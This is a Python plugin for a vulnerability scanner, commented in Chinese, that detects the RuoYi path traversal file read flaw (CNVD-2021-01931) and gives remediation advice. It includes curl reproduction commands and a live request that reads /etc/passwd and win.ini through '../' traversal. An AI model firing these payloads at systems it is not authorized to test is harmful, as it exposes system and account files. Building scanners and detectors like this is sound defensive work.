# 任意文件读取：通过 /common/download/resource 接口读取 /etc/passwd
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.matcher import is_passwd_file
from lib.reporter import emit
from plugins.base import PluginBase


class FileReadPlugin(PluginBase):
    name = "任意文件读取"
    cve = "CNVD-2021-01931"
    severity = "high"
    category = "vuln"
    description = "通过 /common/download/resource 的 resource 参数目录穿越读取 /etc/passwd"
    fix = "限制 resource 参数路径，禁止 .. 目录穿越，下载接口强制鉴权"
    fix_detail = (
        "【升级方案】升级 RuoYi 至 4.7.0+（该版本已修复路径穿越）\n"
        "【代码修复】修改 CommonController.downloadResource()，对 resource 参数做路径校验：\n"
        '  String fileName = resource.substring(resource.lastIndexOf("/") + 1);\n'
        '  if (fileName.contains("..") || fileName.contains("\\")) { throw new ServiceException("非法路径"); }\n'
        "【配置加固】在 application.yml 中限制下载根目录：\n"
        "  ruoyi.profile: /data/upload （不要使用相对路径或用户可写目录）\n"
        "【权限加固】为 /common/download/resource 添加 @PreAuthorize 注解，要求登录后才可访问\n"
        '【WAF 规则】拦截 resource 参数含 ".." 或以 "/" 开头的请求\n'
        "【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制"
    )
    reproduce = (
        'curl "http://target/common/download/resource?resource=/profile/../../../../../../../etc/passwd"\n'
        "\n"
        "# Windows 系统可尝试读取 win.ini：\n"
        'curl "http://target/common/download/resource?resource=/profile/../../../../../../../windows/win.ini"\n'
        "\n"
        '# 预期响应：响应体含 "root:" 或 "[fonts]" 字样（Linux/Windows 系统文件特征）'
    )
    # D2：路径穿越在 4.7.0 已修复
    affected_versions = ">=4.0,<4.7"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A01:2021"
    # D7: WAF 绕过支持
    vuln_type = "file_read"
    supports_waf_bypass = True

    def verify(self, target, session):
        """通过 /common/download/resource 路径穿越读取 /etc/passwd 验证漏洞

        @param target: 目标主机，用于拼接下载接口地址
        @param session: 复用的 HTTP 会话对象
        @return: ScanResult——200 且响应含 ≥2 个 /etc/passwd 账户行（root/系统账户）为 CONFIRMED，否则 SAFE
        """
        # 原 URL 拼接：self.url + '/common/...'（self.url 以 / 结尾，保留双斜杠特性）
        url = join_url(target, "/common/download/resource?resource=/profile/../../../../../../../etc/passwd")
        try:
            resp = session.get(url)
        except Exception as e:
            emit(no("任意文件读取（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))

        text = resp.text or ""
        code = getattr(resp, "status_code", 0)

        # 旧实现判定为 match_all(text, ["root", ":/"])，缺陷：":/" 在任何含 URL 的页面里
        # 必然出现（https:// 就含 :/），该条件实际退化为「响应含 root」，误报率高。
        # 现复用 file_read_path 已有的 /etc/passwd 严格判定（正则匹配 passwd 行 + ≥2 账户行），
        # 并补上 200 状态码校验：非 200（拦截页/错误页）不进入判定。
        if code == 200:
            hit, evidence = is_passwd_file(text)
            if hit:
                emit(ok("存在任意文件读取漏洞"))
                return ScanResult(
                    kind="vuln",
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence=f"响应含真实 /etc/passwd 内容（{evidence}）",
                    fix=self.fix,
                    # 结构化漏洞元数据：报告层按 vuln_type/payload_class 分类聚合统计
                    extra={
                        "vuln_type": "arbitrary_file_read",
                        "payload_class": "traversal_etc_passwd",
                        "plugin_name": "file_read",
                    },
                )
        emit(no("不存在任意文件读取漏洞"))
        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
